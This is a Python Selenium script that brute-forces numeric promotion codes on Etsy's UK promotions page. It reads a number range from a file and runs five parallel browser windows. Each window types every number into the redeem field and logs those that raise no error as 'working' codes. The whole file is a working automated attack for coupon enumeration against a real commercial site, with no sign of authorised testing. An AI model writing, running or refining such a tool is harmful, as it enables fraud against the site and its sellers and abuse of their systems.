from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from concurrent.futures import ThreadPoolExecutor
import time
import math
import json


def test_number_range(start_num, end_num, url):
    driver = webdriver.Chrome()
    driver.get(url)
    #driver.maximize_window()

    results = {
        'working': [],
        'failed': []
    }

    try:
        for number in range(start_num, end_num + 1):
            try:
                # Store the current URL
                initial_url = driver.current_url

                # Wait for elements with shorter timeout
                wait = WebDriverWait(driver, 10)
                input_field = wait.until(ec.presence_of_element_located((By.ID, 'input-promotion-code')))
                button = wait.until(ec.presence_of_element_located((By.ID, 'button-redeem')))

                # Enter and submit the code
                input_field.clear()
                input_field.send_keys(str(number))
                time.sleep(0.2)
                button.click()

                # Wait briefly for potential redirect
                time.sleep(0.5)

                error_message = driver.find_element(By.XPATH,
                                                    '//*[@id="content"]/div[1]/div[2]/div[1]/form/div[2]/span')
                if "Please enter a valid promotion code" in error_message.text:
                    print(f' {number} failed: {error_message.text}')
                    results['failed'].append(number)
                    # Refresh the page to continue testing
                    time.sleep(0.3)  # Wait for the page to reload
                    continue  # Skip to the next number
                else:
                    # If the error message is not found, treat it as success
                    print(f' {number} treated as success (no error message found)')
                    results['working'].append(number)
                    time.sleep(5)  # Wait for 5 seconds before going back to the page
                    driver.get(url)  # Navigate back to the target page
                    continue  # Continue to the next number
            except:
                print(f' {number} treated as success (no error message found)')
                results['working'].append(number)
                time.sleep(5)  # Wait for 5 seconds before going back to the page
                driver.get(url)  # Navigate back to the target page
                continue  # Continue to the next number

    finally:
        print(f"\nWindow {start_num}-{end_num} Complete:")
        print(f"Working numbers: {sorted(results['working'])}")
        print(f"Failed numbers count: {len(results['failed'])}")
        print(f"Total tested numbers: {len(results['working']) + len(results['failed'])}\n")
        driver.quit()

    return results


def test_numbers_in_parallel(start, end, num_windows=4):
    url = 'https://www.etsy.com/uk/promotions'

    # Calculate the range for each window
    total_numbers = end - start + 1
    numbers_per_window = math.ceil(total_numbers / num_windows)

    # Create ranges for each window
    ranges = []
    current_start = start
    for i in range(num_windows):
        current_end = min(current_start + numbers_per_window - 1, end)
        ranges.append((current_start, current_end))
        current_start = current_end + 1
        if current_start > end:
            break

    final_results = {
        'working': [],
        'failed': []
    }

    with ThreadPoolExecutor(max_workers=num_windows) as executor:
        future_to_range = {
            executor.submit(test_number_range, range_start, range_end, url): (range_start, range_end)
            for range_start, range_end in ranges
        }

        for future in future_to_range:
            try:
                result = future.result()
                final_results['working'].extend(result['working'])
                final_results['failed'].extend(result['failed'])
            except Exception as e:
                print(f'Thread error: {str(e)}')

    return final_results


if __name__ == "__main__":
    start_time = time.time()

    # Create or clear the successful_codes.txt file
    open('successful_codes.txt', 'w').close()

    # Read range from range.txt file
    try:
        with open('range.txt', 'r') as f:
            for line in f:
                if line.startswith('range1:'):
                    range_str = line.split(':')[1].strip()
                    start_num, end_num = map(int, range_str.split('-'))
                    range_number = '1'  # Extract range number from 'range2'
                    break
            else:
                print("Could not find range1 in range.txt")
                exit(1)
    except FileNotFoundError:
        print("range.txt file not found")
        exit(1)
    except Exception as e:
        print(f"Error reading range.txt: {str(e)}")
        exit(1)

    # Test numbers using the range from file
    results = test_numbers_in_parallel(start_num, end_num, num_windows=5)

    # Print final results
    print('\n=== Final Testing Results ===')
    print('Working numbers:', sorted(results['working']))
    print('Total working numbers:', len(results['working']))
    print('Total tested numbers:', len(results['working']) + len(results['failed']))

    # Save results to JSON file with range number
    results_filename = f'results{range_number}.json'
    current_time = time.strftime("%Y-%m-%d %H:%M:%S")
    
    # Prepare new data
    new_data = {
        "time": current_time,
        "data": {
            "working_numbers": sorted(results['working']),
            "total_working": len(results['working']),
            "total_tested": len(results['working']) + len(results['failed']),
            "range_tested": f"{start_num}-{end_num}"
        }
    }

    try:
        # Try to read existing data
        with open(results_filename, 'r') as f:
            existing_data = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        # If file doesn't exist or is invalid, start with empty data
        existing_data = {"results": []}

    # Add new data to existing results
    if "results" not in existing_data:
        existing_data = {"results": [existing_data]} if existing_data else {"results": []}
    existing_data["results"].append(new_data)

    # Write back to file
    with open(results_filename, 'w') as f:
        json.dump(existing_data, f, indent=4)

    end_time = time.time()
    print(f"\nTotal execution time: {end_time - start_time:.2f} seconds")
